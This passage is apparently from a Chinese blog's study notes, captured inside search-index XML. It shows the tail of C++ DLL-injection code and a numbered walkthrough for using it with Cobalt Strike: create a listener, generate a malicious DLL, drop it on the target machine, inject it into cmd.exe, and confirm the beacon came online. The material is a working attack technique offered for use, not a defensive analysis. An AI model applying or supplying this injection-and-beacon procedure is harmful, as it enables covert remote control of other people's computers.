class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line"><span class="built_in">CloseHandle</span>(hprocessSnap);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">wchar_t</span> wStr[] = <span class="string">L&quot;·····&quot;</span>;<span class="comment">//要注入的dll文件地址</span></span><br><span class="line">DWORD dwId = <span class="number">0</span>;</span><br><span class="line">DWORD dwPid = <span class="number">0</span>;</span><br><span class="line">WCHAR S[] = <span class="string">L&quot;···&quot;</span>;<span class="comment">//注入的目标exe文件</span></span><br><span class="line">DWORD  SS = <span class="built_in">GetPid</span>(S);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;目标窗口的进程PID为：%d\n&quot;</span>, SS);</span><br><span class="line"><span class="comment">//参数1：目标进程的PID</span></span><br><span class="line"><span class="comment">//参数2：想要注入dll的路径</span></span><br><span class="line"><span class="built_in">Inject</span>(SS, wStr);</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用此方法上线CS"><a href="#利用此方法上线CS" class="headerlink" title="利用此方法上线CS"></a>利用此方法上线CS</h2><p>1.打开Visual Studio新建一个项目<br><img src="https://s2.loli.net/2022/02/23/9cwVvOWoxenaMQS.png" alt="QQ截图20220223211219" style="zoom:80%;" /></p><p>2.将上述完整代码添加进去</p><p>3.我们利用cs创建一个监听<br><img src="https://s2.loli.net/2022/02/23/u7SLboH2yiTVEXK.png" alt="QQ截图20220223211825" style="zoom:80%;" /></p><p>4.生成恶意dll文件<br><img src="https://s2.loli.net/2022/02/23/Lkfu98sibdgwCtZ.png" alt="image-20220223212127573"></p><p>这里根据需求选择32位或者64位，我这里演示的是32位的，选择刚才创建的监听<br><img src="https://s2.loli.net/2022/02/23/WFXlHBIrveVuOc2.png" alt="image-20220223212338591"></p><p>生成dll文件<br><img src="https://s2.loli.net/2022/02/23/QiKHaOMAUt2cuTx.png" alt="image-20220223212455718"></p><p>5.将dll文件放置在目标机的D盘下，我这里注入的进程是<code>cmd.exe</code>，并将<code>main</code>函数补全。<br><img src="https://s2.loli.net/2022/02/23/vieARK94sfQpODq.png" alt="image-20220223212727327"></p><p>6.编译生成exe文件，在将该exe文件在目标及运行即可<br><img src="https://s2.loli.net/2022/02/23/cRT51KI67maVOsf.png" alt="image-20220223212947795"></p><p>7.检查发现<code>cmd.exe</code>中成功加载了恶意dll，且CS也成功上线<br><img src="https://s2.loli.net/2022/02/23/WpohV1y9K6dGfTO.png" alt="image-20220223213247397"  /></p><p><img src="https://s2.loli.net/2022/02/23/NpstPwrg8WRhTQX.png" alt="image-20220223213351526"></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
